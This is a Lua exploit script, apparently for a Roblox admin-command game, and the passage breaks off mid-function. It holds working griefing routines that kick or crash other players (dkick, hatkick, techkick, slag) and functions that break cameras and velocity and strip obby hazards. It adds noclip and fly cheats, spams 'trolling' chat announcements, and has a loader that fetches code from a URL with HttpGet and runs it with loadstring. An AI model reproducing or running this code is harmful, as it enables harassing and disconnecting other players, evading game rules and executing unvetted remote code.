-- LUA CMDS
function Execute(testcode)
      loadstring(testcode)()
end

-- LUA EXECUTE
function GExecute(myscript)
                loadstring(game:HttpGet((myscript),true))()
end

-- ANNOUNCEMENTS
function Announce()
      Chat("h \n\n\n "..annsecret.. " \n\n\n")
end

-- we do a bit of trolling
function AnnounceWM()
      Chat("h \n\n\n "..sus..": "..whatsapp.. " \n\n\n")
end

-- cmd v3 code 
function dkick(dk, dkicked)
	    local ota = #workspace:FindFirstChild(dkicked):GetChildren()
            Chat('skydive ' .. dkicked)
            repeat task.wait() until workspace:FindFirstChild(dkicked).HumanoidRootPart.CFrame.Y >= 999
            task.wait()
            Chat('punish ' .. dkicked)
            repeat task.wait() until game.Lighting:FindFirstChild(dkicked)

            repeat 
                if not game.Lighting:FindFirstChild(dkicked) then
                    Chat('punish ' .. dkicked) 
                end 
                task.wait() 
                Chat("dog " .. dkicked .. " " .. dkicked .. " " .. dkicked)
                task.wait() 
                Chat("freeze " .. dkicked .. " " .. dkicked .. " " .. dkicked) 
            until 
                (#game.Lighting:FindFirstChild(dkicked):GetChildren() - ota) >= 1500 or dkickin == false

	    if dkickin == false then 
	    else
            	task.wait(.5)
            	Chat("noclip " .. dkicked)
            	task.wait()
            	Chat('unpunish ' .. dkicked)
           	task.wait()
            	Chat('kill ' .. dkicked .. " " .. dkicked .. " " .. dkicked)
	    	dkickin = false
            end
end

-- hat (mesh) kick
function hatkick(kickin, kickinplr) -- v, V.Name
		Chat("respawn "..kickinplr)
		task.wait(.25)
 		Chat("tp me  "..kickinplr)
		task.wait(0.4)
	        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = kickin.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,5) * CFrame.Angles(0,math.rad(180),0)

		for i = 1, 10 do
			if game.Players:FindFirstChild(kickinplr) then
				for i = 1, 100 do
   					 Chat("hat me 18137588505")
					 task.wait(.5)
   					 Chat("clone me")
				end
				task.wait(.3)
			end
		end
end

function techkick(kickin, kickinplr) -- Tech's hatkick
	        hatspammingz = true
		Chat("respawn "..kickinplr)
		Chat("blind "..kickinplr.."                                                                                                                                                                      discord")
		Chat("invis "..kickinplr.."                                                                                                                                                                      discord")
		Chat("skydive "..kickinplr.." "..kickinplr.." "..kickinplr.."                                                                                                                                    discord")
		Chat("skydive "..kickinplr.." "..kickinplr.." "..kickinplr.."                                                                                                                                    discord")
		Chat("skydive "..kickinplr.." "..kickinplr.." "..kickinplr.."                                                                                                                                    discord")
		Chat("size "..kickinplr.." 9.9")
		Chat("size "..kickinplr.." 9.9")
		chatt("spin                                                                                                                                                                      "..kickinplr.." discord")
		task.wait(0.15)
		Chat("setgrav "..kickinplr.." -251.2")

		task.delay(3.65, function()
			hatspammingz = false
		end)

		for i = 1, 103 do
			chatt("hat "..kickinplr.." 18137588505")
		end

		while hatspammingz do task.wait()
			chatt("hat "..kickinplr.." 18137588505")
		end
end


function slag(tplr, tpln) -- v, v.Name
            local stop = false

            Chat("freeze " .. tpln)
            tplr.Character:WaitForChild("ice")
            Chat("name " .. tpln .. " ")
            task.wait()
            Chat("thaw " .. tpln)
        
            for i = 1,30 do
                Chat("gear me 2274759555")
                task.wait(.05)
            end

            local pass = false

            repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= 30

            local conn1
            local conn2
            local Skates = {}
            local primarySkate = Skates[1]

            local oldPosi = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            local toCF = tplr.Character.HumanoidRootPart.CFrame * CFrame.new(0,-3,0)

            workspace.ChildAdded:Connect(function(Skate)
                if Skate.Name == "Skateboard" and not table.find(Skates, Skate) then
                    	for _,v in pairs(Skate:GetChildren()) do
                        	if v:IsA("BasePart") then
                            		v.CanCollide = false
                            		v.CanTouch = false
                           		v.Massless = true
                        	end
                    	end
		
                    	Skate.ChildAdded:Connect(function(v)
                        	if v:IsA("BasePart") then
                            		v.CanCollide = false
                            		v.CanTouch = false
                            		v.Massless = true
                        	end	
                    	end)
		
                   	table.insert(Skates, Skate)
                    	Skate.PrimaryPart = Skate:WaitForChild("SkateboardPlatform")
                    	Skate.PrimaryPart.Velocity = Vector3.new(30,4,0)
                    	local skatespos = #Skates

			RunService = game:GetService("RunService")
                    	RunService.Heartbeat:Connect(function()
                        	Skate.PrimaryPart.Velocity = Vector3.new(30,4,0)
                        	Skate:SetPrimaryPartCFrame(tplr.Character.HumanoidRootPart.CFrame * CFrame.new(0,-3 + skatespos * .25,0))
                    	end)
                end
            end)

            for _, Tool in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                if Tool.Name == "GoldenSkateboard" then
                    task.spawn(function()
                        Tool:WaitForChild("LocalScript").Disabled = true
                        Tool:WaitForChild("RemoteControl"):WaitForChild("ClientControl").OnClientInvoke = function(Value)
                            if Value == "MousePosition" then
                                return tplr.Character.HumanoidRootPart.Position
                            end
                        end
                        Tool.Parent = game.Players.LocalPlayer.Character
                        task.wait()
                        Tool:Activate()
                    end)
                    task.wait()
                end
            end

            task.delay(3.25, function()
                Chat("reset " .. tpln)
                task.wait()
                Chat("unskydive " .. tpln)
		Chat("thaw " .. tpln)
                task.wait()
            end)
end

-- SPAWN SAVED
function Spawn()
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savspawn
      Remind("Sent to your saved spawn")
end

-- SET SPAWN
function SSpawn()
        savspawn = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        Remind("Your saved spawn is: "..savspawn) ; print("Your saved spawn is: "..savspawn)
end

-- CURRENT POS
function CPOS()
	print("Your current position is: "..game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
end

-- HOUSE
function House()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-31.0896435, 8.22999477, 70.522644, -0.999961913, 4.495271e-08, -0.0087288795, 4.55292621e-08, 1, -6.58523618e-08, 0.0087288795, -6.62472743e-08, -0.999961913)
end

-- SPAWN
function GSpawn()
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-29, 3.70000005, -25.5900116)) -- -41, 3.7, -15.589996337891
end

-- Cam Break
function NoCam()
      Chat("gear me 4842207161")
      repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("AR")
      local cambrek = game.Players.LocalPlayer.Backpack:FindFirstChild("AR")
      cambrek.Parent = game.Players.LocalPlayer.Character
      task.wait(0.2)
      cambrek:Activate()
      Remind("The camera is now broken into shiftlock - you won't see the effect until you rejoin.")
end

function NoVelo()
    Chat("gear me 111876831")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("April Showers")
    local aps = game.Players.LocalPlayer.Backpack:FindFirstChild("April Showers")
    aps.Parent = game.Players.LocalPlayer.Character
    wait(0.2)
    aps:Activate()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer:GetMouse().Hit.p.X,game.Players.LocalPlayer:GetMouse().Hit.p.Y,game.Players.LocalPlayer:GetMouse().Hit.p.Z)
    task.wait()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.new(0,0,3.6)
    Remind("Please wait for 15 seconds...");task.wait(5);Remind("10 more seconds...");task.wait(5);Remind("5 more seconds...");task.wait(5)
    Chat("gear me 110789105")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("RageTable")
    local rage = game.Players.LocalPlayer.Backpack:FindFirstChild("RageTable")
    rage.Parent = game.Players.LocalPlayer.Character
    wait(0.2)
    rage:Activate()
    Remind("Velocity should be broken for the object you wanted it to do so!")
end

-- BREAK AND FIX CAM 2
function TogCam(mode)
    Chat("tp others me")
    Chat("gear me 68354832")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("BlizzardWand")
    local wand = game.Players.LocalPlayer.Backpack:FindFirstChild("BlizzardWand")
    wand.Parent = game.Players.LocalPlayer.Character
    wait(0.2)
    wand:Activate()
    if mode == "b" then
    		wait(0.4)
    		Chat("reset all")
    end
end

function FCAM(cplr, player)
	if firetouchinterest then 
		-- 
	else
		Remind("Command may not work since firetouchinterest is not supported by your executor.")
	end
	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999,99999,99999)
	local instancechina = Instance.new("Part",game.Players.LocalPlayer.Character)
	instancechina.Anchored = true
	instancechina.Size = Vector3.new(10,1,10)
	instancechina.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-5,0)
    	Chat("gear me 94794847")
    	repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    	local VampireVanquisher = game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    	VampireVanquisher.Parent = game.Players.LocalPlayer.Character
    	repeat task.wait() until not game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Coffin")
    	repeat task.wait()
    		firetouchinterest(VampireVanquisher.Handle,cplr.Character.Head,0)
		firetouchinterest(VampireVanquisher.Handle,cplr.Character.Head,1)
    	until game.Players.LocalPlayer:DistanceFromCharacter(cplr.Character.Head.Position) < 10
        Chat("respawn me")
end

-- FIX CAM (client)
function FixCam()
                task.spawn(function()

                        local Player = game.Players.LocalPlayer
                        local PlayerService = game:GetService("Players")
		
                        local lp = PlayerService.LocalPlayer
                        local UIS = game:GetService("UserInputService")
                        local CAS = game:GetService("ContextActionService")
                        local RUS = game:GetService('RunService')
		
                        CAS:UnbindAction("ShoulderCameraSprint")
                        RUS:UnbindFromRenderStep("ShoulderCameraUpdate")
                        CAS:UnbindAction("ShoulderCameraZoom")
		
                        while true do
                                task.wait()
			
                                repeat game:GetService('RunService').Heartbeat:Wait() until game.Workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable
			
                                RUS:UnbindFromRenderStep("ShoulderCameraUpdate")
                                CAS:UnbindAction("ShoulderCameraZoom")
                                CAS:UnbindAction("ShoulderCameraSprint")
			
                                local WEPSYS = game:GetService("ReplicatedStorage"):FindFirstChild('WeaponsSystem')
                                if not WEPSYS then 
					return 
				end
			
                                for i,v in pairs(WEPSYS:GetDescendants()) do
                                        if v:IsA("Script") then
                                                v.Disabled = true
                                        end
                                        v:Destroy()
                                end
			
                                local CWS = lp.PlayerGui:FindFirstChild("ClientWeaponsScript")
                                local WSG = lp.PlayerGui:FindFirstChild("WeaponsSystemGui")
                                local CWS_2 = lp.PlayerScripts:FindFirstChild("ClientWeaponsScript")
                                local Camera = game:GetService("Workspace"):FindFirstChild("Camera")
			
                                if CWS then 
					CWS.Disabled = true
					CWS:Destroy() 
				end
			
                                if WSG then 
					WSG:Destroy() 
				end
			
                                if CWS_2 then
                                        CWS_2.Disabled = true
                                        CWS_2:Destroy()
                                end
			
                                game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.Default
			
                                UIS.MouseIconEnabled = true
			
                                PlayerService.LocalPlayer.CameraMaxZoomDistance = 400
                                PlayerService.LocalPlayer.CameraMinZoomDistance = 0.5
                                Camera.FieldOfView = 70
			
                                game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
                                game.Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
			
                                lp.Character.Humanoid.AutoRotate = true 
                        end
		
                end)
end

-- INFINITE JUMP
game:GetService("UserInputService").JumpRequest:Connect(function()
            task.wait(0)
            if INFJUMP == true then
               game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState("Jumping")
            end
end)

-- NOK
function NOK()
	game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump.TouchInterest:destroy()
	game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump1.TouchInterest:destroy()
	game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump2.TouchInterest:destroy()
	game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump3.TouchInterest:destroy()
	game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump4.TouchInterest:destroy()
	game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump5.TouchInterest:destroy()
	game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump6.TouchInterest:destroy()
	game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump7.TouchInterest:destroy()
	game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump8.TouchInterest:destroy()
	game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump9.TouchInterest:destroy()
	Remind("Rejoin the server to revert!")
end

-- NOK 2
function NOK2()
  for i,v in pairs(workspace.Terrain["_Game"]["Workspace"].Obby:GetDescendants()) do
        if v:IsA("TouchTransmitter") then 
		v:Destroy() 
        end
  end
  Remind("Rejoin the server to revert!")
end

-- NOK 3 (idk where it went but it's back now)
function NOK3()
    local objs = game:GetService("Workspace").Terrain._Game.Workspace.Obby:GetChildren()
    for i, obj in pairs(objs) do
        coroutine.wrap(function()
            pcall(function()
                obj.TouchInterest:Destroy()
            end)
        end)()
    end
    Remind("Rejoin the server to revert!")
end

-- temp NOK
function TNOK(mode) -- vitalux cmd
        for i, v in pairs(game:GetService("Workspace").Terrain._Game.Workspace.Obby:GetChildren()) do -- also removes obby walls collision 
                if mode == "true" then
                        v.CanTouch = false
                else
                        v.CanTouch = true
                end
        end
end

-- PING
function GetPing()
	local RSP = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() + 0.5) -- i can't be bothered to use a more precise version. it's only a 1ms difference if it's rounded wrong xd
	Speak("Ping is " .. RSP .. "ms.")
end

--- broken lool
function FRespawn()
	game.Players.LocalPlayer.Character:Destroy()
end

function MRespawn()
			local Player = game.Players.LocalPlayer
			local PlayerService = game:GetService("Players")
                        local char = game.Players.LocalPlayer.Character
                        if char:FindFirstChildOfClass("Humanoid") then 
                                char:FindFirstChildOfClass("Humanoid"):ChangeState(15) 
                        end
                        char:ClearAllChildren()
                        local newChar = Instance.new("Model")
                        newChar.Parent = workspace
                        PlayerService.LocalPlayer.Character = newChar
                        wait()
                        PlayerService.LocalPlayer.Character = char
                        newChar:Destroy()
end

function Dummy()
                        local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                        Chat("char me 5647726938")
                        task.wait(0.5)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
                        Chat("face me 8560971")
                        Chat("unpants me")
                        repeat task.wait() until not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Pants")
                        task.wait(0.5)
                        Chat("name me NPC")
                        repeat task.wait() until game.Players.LocalPlayer.Character:FindFirstChild("NPC")
                        Chat("clone me")
                        task.wait(0.5)
                        Chat("unchar me")
                        task.wait(0.5)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end

-- Removing and adding the obby locally
function LocalObby(mode)
        if mode == "add" then
                 game.Chat:FindFirstChild("Obby").Parent = workspace.Terrain["_Game"]["Workspace"]
                     game.Chat:FindFirstChild("Obby Box").Parent = workspace.Terrain["_Game"]["Workspace"]
        else 
                    workspace.Terrain["_Game"]["Workspace"].Obby.Parent = game.Chat
                        workspace.Terrain["_Game"]["Workspace"]["Obby Box"].Parent = game.Chat
        end
end

local Noclipping = nil

function noclip()
	local function NoclipLoop()
		if Clip == false and game.Players.LocalPlayer.Character ~= nil then
			for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
					child.CanCollide = false
				end
			end
		end
	end
	Noclipping = RunService.Stepped:Connect(NoclipLoop)
end

function clip()
	if Noclipping then
		Noclipping:Disconnect()
	end
end

-- KAH fly
function UFLY()

	eincrash = false
	local isFlying = true

	local bodyGyro = nil
	local bodyVel = nil
	local mathObj = 0

	local movementVector = { f = 0, b = 0, l = 0, r = 0 }
	local movementVector2 = { f = 0, b = 0, l = 0, r = 0 }

	local maxspeed = 50
	local speed = 0

	local plrs = game:GetService("Players")
	local localPlr = plrs.LocalPlayer
	local mouse = localPlr:GetMouse()
	local character = localPlr.Character
	local playerTorso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")

	local keyConnection1, keyConnection2

	function Fly()
		character.Humanoid.PlatformStand = true

		bodyGyro = Instance.new("BodyGyro", playerTorso)
		bodyGyro.P = 90000
		bodyGyro.maxTorque = Vector3.new(9000000000, 9000000000, 9000000000)
		bodyGyro.cframe = playerTorso.CFrame
		bodyVel = Instance.new("BodyVelocity", playerTorso)
		bodyVel.velocity = Vector3.new(0, 0.1, 0)
		bodyVel.maxForce = Vector3.new(9000000000, 9000000000, 9000000000)
		while isFlying do
			wait()

			if eincrash then 
				isFlying = false 
				break 
			end
			
			if movementVector.l + movementVector.r == 0 then
				if movementVector.f + movementVector.b ~= 0 then
					mathObj = mathObj + 0.5 + mathObj / maxspeed
					if maxspeed < mathObj then
						mathObj = maxspeed
					end
				elseif movementVector.l + movementVector.r == 0 then
					if movementVector.f + movementVector.b == 0 then
						if mathObj ~= 0 then
							mathObj = mathObj - 1
							if mathObj < 0 then
								mathObj = 0
							end
						end
					end
				end
			else
				mathObj = mathObj + 0.5 + mathObj / maxspeed
				if maxspeed < mathObj then
					mathObj = maxspeed
				end
			end
			if movementVector.l + movementVector.r == 0 then
				if movementVector.f + movementVector.b ~= 0 then
					bodyVel.velocity = (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (movementVector.f + movementVector.b) + (game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(movementVector.l + movementVector.r, (movementVector.f + movementVector.b) * 0.2, 0).p - game.Workspace.CurrentCamera.CoordinateFrame.p)) * mathObj
					movementVector2 = {
						f = movementVector.f, 
						b = movementVector.b, 
						l = movementVector.l, 
						r = movementVector.r
					}
				elseif movementVector.l + movementVector.r == 0 then
					if movementVector.f + movementVector.b == 0 then
						if mathObj ~= 0 then
							bodyVel.velocity = (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (movementVector2.f + movementVector2.b) + (game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(movementVector2.l + movementVector2.r, (movementVector2.f + movementVector2.b) * 0.2, 0).p - game.Workspace.CurrentCamera.CoordinateFrame.p)) * mathObj
						else
							bodyVel.velocity = Vector3.new(0, 0.1, 0)
						end
					else
						bodyVel.velocity = Vector3.new(0, 0.1, 0)
					end
				else
					bodyVel.velocity = Vector3.new(0, 0.1, 0)
				end
			else
				bodyVel.velocity = (game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (movementVector.f + movementVector.b) + (game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(movementVector.l + movementVector.r, (movementVector.f + movementVector.b) * 0.2, 0).p - game.Workspace.CurrentCamera.CoordinateFrame.p)) * mathObj
				movementVector2 = {
					f = movementVector.f, 
					b = movementVector.b, 
					l = movementVector.l, 
					r = movementVector.r
				}
			end
			bodyGyro.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((movementVector.f + movementVector.b) * maxspeed * mathObj / maxspeed), 0, 0)
			if isFlying then
			else
				break
			end		
		end
		movementVector = { f = 0, b = 0, l = 0, r = 0 }
		movementVector2 = { f = 0, b = 0, l = 0, r = 0 }
		mathObj = 0
		bodyGyro:Destroy()
		bodyVel:Destroy()
		character.Humanoid.PlatformStand = false
	end

	keyConnection1 = mouse.KeyDown:connect(function(kc)
		if kc:lower() == "e" then
			if isFlying then
				isFlying = false
				return
			else
				isFlying = true
				Fly()
				return
			end
		end
		
		if kc:lower() == "w" then
			movementVector.f = 1
			return
		end
		
		if kc:lower() == "s" then
			movementVector.b = -1
			return
		end
		
		if kc:lower() == "a" then
			movementVector.l = -1
			return
		end
		
		if kc:lower() == "d" then
			movementVector.r = 1
		end
	end)

	keyConnection2 = mouse.KeyUp:connect(function(kc)
		if kc:lower() == "w" then
			movementVector.f = 0
			return
		end
		
		if kc:lower() == "s" then
			movementVector.b = 0
			return
		end
		
		if kc:lower() == "a" then
			movementVector.l = 0
			return
		end
		
		if kc:lower() == "d" then
			movementVector.r = 0
		end
	end)

	Fly()

	while true do task.wait(0) 
		if eincrash then 
			isFlying = false ; keyConnection1:Disconnect() ;  keyConnection2:Disconnect() 
			break
			end
		end
end

SkipEvent = Instance.new("BindableEvent")
StopEvent = Instance.new("BindableEvent")

function Playlist(shazam) -- cmd v3
        local Params = Instance.new("AudioSearchParams")
        Params.SearchKeyword = shazam
        Params.AudioSubType = Enum.AudioSubType.Music
        Params.MinDuration = 60
        
        local returnables = {}
        
        local audioPage = game:GetService("AssetService"):SearchAudio(Params)
        
        repeat task.wait()
            for _,audioTable in pairs(audioPage:GetCurrentPage()) do
                task.spawn(function()
                    returnables[#returnables + 1] = {
                        Id = audioTable.Id,
                        Duration = audioTable.Duration, 
                        Title = audioTable.Title
                    }
                end)
            end
            audioPage:AdvanceToNextPageAsync()
        until
            audioPage.IsFinished
        
        local musicstop = false

        local con
        con = StopEvent.Event:Connect(function()
            musicstop = true
            SkipEvent:Fire()
        end)

        Chat("h \n\n\n\n \n\n\n\n Found " .. #returnables .. " songs. \n\n\n\n")

        for _,v in pairs(returnables) do
            if musicstop then break end
            local musicskip = false
            Chat("music " .. v.Id)
            Chat("h \n\n\n Now playing: " .. v.Title .. " (" .. v.Duration .. "s) \n\n\n")
            
            local conn
            conn = SkipEvent.Event:Connect(function()
                musicskip = true
                conn:Disconnect()
            end)

            task.delay(v.Duration, function()
                musicskip = true
            end)

            repeat task.wait() until musicskip
            Chat("music 0") 
        end
end

-- R15 checker
function checkforR15()
	if game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
		return true
	end
end

-- Root finder
function getRoot(char)
	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
	return rootPart
end

-- Torso finder
function getTorso(x)
	x = x or game.Players.LocalPlayer.Character
	return x:FindFirstChild("Torso") or x:FindFirstChild("UpperTorso") or x:FindFirstChild("LowerTorso") or x:FindFirstChild("HumanoidRootPart")
end

-- Rig Changer
function ChangeRig(rig)
	AvatarEditorService = game:GetService("AvatarEditorService")
	local humanoid = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
	if humanoid then
		AvatarEditorService:PromptSaveAvatar(humanoid.HumanoidDescription, Enum.HumanoidRigType[rig])
		local result = AvatarEditorService.PromptSaveAvatarCompleted:Wait()
		if result == Enum.AvatarPromptResult.Success then
				--game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				Chat("kill me");Remind("SUCCESS! Please wait until you respawn.")
		end
	end
end

function randomString()
	local length = math.random(10,20)
	local array = {}
	for i = 1, length do
		array[i] = string.char(math.random(32, 126))
	end
	return table.concat(array)
end

FLYING = false
QEfly = true
iyflyspeed = 1

function sFLY()
	repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and getRoot(game.Players.LocalPlayer.Character) and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	repeat wait() until game.Players.LocalPlayer:GetMouse()

	if flyKeyDown or flyKeyUp then 
		flyKeyDown:Disconnect() flyKeyUp:Disconnect() 
	end

	local T = getRoot(game.Players.LocalPlayer.Character)
	local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
	local SPEED = 0

	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro')
		local BV = Instance.new('BodyVelocity')
		BG.P = 9e4
		BG.Parent = T
		BV.Parent = T
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		task.spawn(function()
			repeat wait()
				if game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
					game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
				end
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0, 0)
				end
				BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
			SPEED = 0
			BG:Destroy()
			BV:Destroy()
			if game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
				game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
			end
		end)
	end

	flyKeyDown = game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = (flyspeed)
		elseif KEY:lower() == 's' then
			CONTROL.B = - (flyspeed)
		elseif KEY:lower() == 'a' then
			CONTROL.L = - (flyspeed)
		elseif KEY:lower() == 'd' then 
			CONTROL.R = (flyspeed)
		elseif QEfly and KEY:lower() == 'e' then
			CONTROL.Q = (flyspeed)*2
		elseif QEfly and KEY:lower() == 'q' then
			CONTROL.E = -(flyspeed)*2
		end

		pcall(function() 
			workspace.CurrentCamera.CameraType = Enum.CameraType.Track 
		end)
	end)

	flyKeyUp = game.Players.LocalPlayer:GetMouse().KeyUp:Connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		elseif KEY:lower() == 'e' then
			CONTROL.Q = 0
		elseif KEY:lower() == 'q' then
			CONTROL.E = 0
		end
	end)

	FLY()
end

function NOFLY()
	FLYING = false

	if flyKeyDown or flyKeyUp then 
		flyKeyDown:Disconnect() 
		flyKeyUp:Disconnect() 
	end

	if game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
		game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
	end

	pcall(function() 
		workspace.CurrentCamera.CameraType = Enum.CameraType.Custom 
	end)
end

local velocityHandlerName = randomString()
local gyroHandlerName = randomString()
local mfly1
local mfly2

functionsareannoying = game.Players.LocalPlayer
local mobilefly = function(functionsareannoying)
	unmobilefly(game.Players.LocalPlayer)
	FLYING = true

	local root = getRoot(game.Players.LocalPlayer.Character)
	local camera = workspace.CurrentCamera
	local v3none = Vector3.new()
	local v3zero = Vector3.new(0, 0, 0)
	local v3inf = Vector3.new(9e9, 9e9, 9e9)

	local controlModule = require(game.Players.LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
	local bv = Instance.new("BodyVelocity")
	bv.Name = velocityHandlerName
	bv.Parent = root
	bv.MaxForce = v3zero
	bv.Velocity = v3zero

	local bg = Instance.new("BodyGyro")
	bg.Name = gyroHandlerName
	bg.Parent = root
	bg.MaxTorque = v3inf
	bg.P = 1000
	bg.D = 50

	mfly1 = game.Players.LocalPlayer.CharacterAdded:Connect(function()
		local bv = Instance.new("BodyVelocity")
		bv.Name = velocityHandlerName
		bv.Parent = root
		bv.MaxForce = v3zero
		bv.Velocity = v3zero

		local bg = Instance.new("BodyGyro")
		bg.Name = gyroHandlerName
		bg.Parent = root
		bg.MaxTorque = v3inf
		bg.P = 1000
		bg.D = 50
	end)

	RunService = game:GetService("RunService")
	mfly2 = RunService.RenderStepped:Connect(function()
		root = getRoot(game.Players.LocalPlayer.Character)
		camera = workspace.CurrentCamera
		if game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid") and root and root:FindFirstChild(velocityHandlerName) and root:FindFirstChild(gyroHandlerName) then
			local humanoid = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
			local VelocityHandler = root:FindFirstChild(velocityHandlerName)
			local GyroHandler = root:FindFirstChild(gyroHandlerName)

			VelocityHandler.MaxForce = v3inf
			GyroHandler.MaxTorque = v3inf

			humanoid.PlatformStand = true 

			GyroHandler.CFrame = camera.CoordinateFrame
			VelocityHandler.Velocity = v3none

			local direction = controlModule:GetMoveVector()

			if direction.X > 0 then
				VelocityHandler.Velocity = VelocityHandler.Velocity + camera.CFrame.RightVector * (direction.X * ((flyspeed) * 50))
			end

